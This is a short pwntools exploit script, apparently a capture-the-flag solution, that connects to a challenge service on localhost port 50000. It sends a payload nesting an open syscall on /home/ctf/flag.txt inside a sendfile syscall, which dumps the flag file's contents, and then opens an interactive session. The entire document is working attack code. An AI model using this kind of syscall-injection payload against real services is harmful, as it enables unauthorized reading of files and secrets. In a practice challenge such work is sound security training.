from pwn import *

r  = remote('localhost', 50000)
r.sendline(b'syscall(40,1,syscall(2,"/home/ctf/flag.txt",0,0),0)')
r.interactive()